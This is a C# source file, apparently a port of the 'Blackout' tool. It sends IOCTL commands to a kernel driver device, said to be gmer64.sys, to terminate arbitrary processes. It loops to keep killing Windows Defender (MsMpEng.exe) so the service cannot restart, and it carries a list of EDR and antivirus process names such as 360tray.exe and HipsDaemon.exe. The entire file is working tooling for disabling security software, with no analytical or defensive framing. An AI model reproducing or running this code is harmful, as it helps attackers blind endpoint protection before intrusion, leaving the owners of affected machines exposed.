using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

// https://github.com/ZeroMemoryEx/Blackout/blob/master/Blackout/Blackout.cpp
// https://xz.aliyun.com/t/12927?time__1311=mqmhqIx%2BxAxjrxBqDTWxUr%3DHmIbLYD&alichlgref=https%3A%2F%2Fwww.google.com%2F
// https://www.binarydefense.com/resources/blog/threadsleeper-suspending-threads-via-gmer64-driver/

class Program
{
    // Gmer64.sys 设备IO控制码
    // IOCTL 0x9876C004
    // IOCTL 0x9876C094

    const uint INITIALIZE_IOCTL_CODE = 0x9876C004;
    const uint TERMINATE_PROCESS_IOCTL_CODE = 0x9876C094;

    // 预定义的EDR进程名列表
    static readonly string[] edrList = {
        "360tray.exe","360Safe.exe","360leakfixer.exe","ZhuDongFangYu.exe",
        "HipsDaemon.exe","HipsTray.exe","PopBlock.exe","wsctrlsvc.exe",
        "redcloak", "secureworks", "securityhealthservice",
    };

    // 检查进程是否在EDR列表中的方法
    static bool IsInEdrList(string processName)
    {
        string lowerProcessName = processName.ToLower();
        for (int i = 0; i < edrList.Length; i++)
        {
            if (lowerProcessName.Contains(edrList[i]))
                return true;
        }
        return false;
    }


    // 程序的主入口点
    static void Main(string[] args)
    {
        if (args.Length != 2 || args[0] != "-p")
        {
            Console.WriteLine("Invalid argument. Usage: Blackout.exe -p <process_id>");
            return;
        }

        if (!int.TryParse(args[1], out int pid) || Process.GetProcessById(pid) == null)
        {
            Console.WriteLine("Provided process id doesn't exist !!");
            return;
        }

        IntPtr hDevice = NativeMethods.CreateFile(
            @"\\.\\Blackout",
            NativeMethods.GenericAccess.GENERIC_WRITE | NativeMethods.GenericAccess.GENERIC_READ,
            NativeMethods.FileShare.FILE_SHARE_READ | NativeMethods.FileShare.FILE_SHARE_WRITE,
            IntPtr.Zero,
            NativeMethods.FileMode.OPEN_EXISTING,
            NativeMethods.FileFlagsAndAttributes.FILE_ATTRIBUTE_NORMAL,
            IntPtr.Zero);

        if (hDevice == NativeMethods.INVALID_HANDLE_VALUE)
        {
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine($"Failed to open handle to driver. Error code: {errorCode}");
            return;
        }

        uint input = (uint)pid;
        int bytesReturned;
        bool result = NativeMethods.DeviceIoControl(
            hDevice,
            INITIALIZE_IOCTL_CODE,
            ref input,
            sizeof(uint),
            IntPtr.Zero,
            0,
            out bytesReturned,
            IntPtr.Zero);

        if (!result)
        {
            Console.WriteLine($"Failed to send initializing request {INITIALIZE_IOCTL_CODE:X} !!");
            return;
        }

        Console.WriteLine($"Driver initialized {INITIALIZE_IOCTL_CODE:X} !!");

        if (GetProcessIdByName("MsMpEng.exe") == input)
        {
            Console.WriteLine("Terminating Windows Defender..");
            Console.WriteLine("Keep the program running to prevent the service from restarting it");
            bool once = true;
            while (true)
            {
                if (input == GetProcessIdByName("MsMpEng.exe"))
                {
                    if (!NativeMethods.DeviceIoControl(
                        hDevice,
                        TERMINATE_PROCESS_IOCTL_CODE,
                        ref input,
                        sizeof(uint),
                        IntPtr.Zero,
                        0,
                        out bytesReturned,
                        IntPtr.Zero))
                    {
                        Console.WriteLine($"DeviceIoControl failed. Error: {Marshal.GetLastWin32Error():X} !!");
                        NativeMethods.CloseHandle(hDevice);
                        return;
                    }
                    if (once)
                    {
                        Console.WriteLine("Defender Terminated..");
                        once = false;
                    }
                }

                Thread.Sleep(700);
            }
        }
        else
        {
            Console.WriteLine("Terminating process !!");

            result = NativeMethods.DeviceIoControl(
                hDevice,
                TERMINATE_PROCESS_IOCTL_CODE,
                ref input,
                sizeof(uint),
                IntPtr.Zero,
                0,
                out bytesReturned,
                IntPtr.Zero);

            if (!result)
            {
                Console.WriteLine($"Failed to terminate process: {Marshal.GetLastWin32Error():X} !!");
                NativeMethods.CloseHandle(hDevice);
                return;
            }

            Console.WriteLine("Process has been terminated!");
        }

        NativeMethods.CloseHandle(hDevice);
    }

    static uint GetProcessIdByName(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length > 0)
        {
            return (uint)processes[0].Id;
        }
        return 0;
    }

    // 嵌套的NativeMethods类，包含用于调用Windows API的P/Invoke声明
    class NativeMethods
    {
        public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            ServiceManagerAccess desiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            ServiceAccess dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateService(
            IntPtr hSCManager,
            string lpServiceName,
            string lpDisplayName,
            ServiceAccess dwDesiredAccess,
            ServiceType dwServiceType,
            ServiceStartType dwStartType,
            ServiceErrorControl dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFile(
            string lpFileName,
            GenericAccess dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            FileFlagsAndAttributes dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            ref uint lpInBuffer,
            int nInBufferSize,
            IntPtr lpOutBuffer,
            int nOutBufferSize,
            out int lpBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(
            SnapshotFlags dwFlags,
            uint th32ProcessID);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool Process32First(
            IntPtr hSnapshot,
            ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool Process32Next(
            IntPtr hSnapshot,
            ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CloseHandle(
            IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }

        [Flags]
        public enum GenericAccess : uint
        {
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000
        }

        [Flags]
        public enum FileShare : uint
        {
            FILE_SHARE_READ = 0x1,
            FILE_SHARE_WRITE = 0x2,
            FILE_SHARE_DELETE = 0x4
        }

        public enum FileMode : uint
        {
            CREATE_NEW = 1,
            CREATE_ALWAYS = 2,
            OPEN_EXISTING = 3,
            OPEN_ALWAYS = 4,
            TRUNCATE_EXISTING = 5
        }

        [Flags]
        public enum FileFlagsAndAttributes : uint
        {
            FILE_ATTRIBUTE_NORMAL = 0x80,
        }

        [Flags]
        public enum SnapshotFlags : uint
        {
            TH32CS_SNAPPROCESS = 0x00000002
        }

        [Flags]
        public enum ServiceManagerAccess : uint
        {
            SC_MANAGER_ALL_ACCESS = 0xF003F
        }

        [Flags]
        public enum ServiceAccess : uint
        {
            SERVICE_ALL_ACCESS = 0xF01FF
        }

        public enum ServiceType : uint
        {
            SERVICE_KERNEL_DRIVER = 0x00000001,
            SERVICE_FILE_SYSTEM_DRIVER = 0x00000002
        }

        public enum ServiceStartType : uint
        {
            SERVICE_BOOT_START = 0x00000000,
            SERVICE_SYSTEM_START = 0x00000001,
            SERVICE_AUTO_START = 0x00000002,
            SERVICE_DEMAND_START = 0x00000003,
            SERVICE_DISABLED = 0x00000004
        }

        public enum ServiceErrorControl : uint
        {
            SERVICE_ERROR_IGNORE = 0x00000000,
            SERVICE_ERROR_NORMAL = 0x00000001,
            SERVICE_ERROR_SEVERE = 0x00000002,
            SERVICE_ERROR_CRITICAL = 0x00000003
        }

        public enum ServiceState : uint
        {
            SERVICE_STOPPED = 0x00000001,
            SERVICE_START_PENDING = 0x00000002,
            SERVICE_STOP_PENDING = 0x00000003,
            SERVICE_RUNNING = 0x00000004,
            SERVICE_CONTINUE_PENDING = 0x00000005,
            SERVICE_PAUSE_PENDING = 0x00000006,
            SERVICE_PAUSED = 0x00000007
        }
    }
}

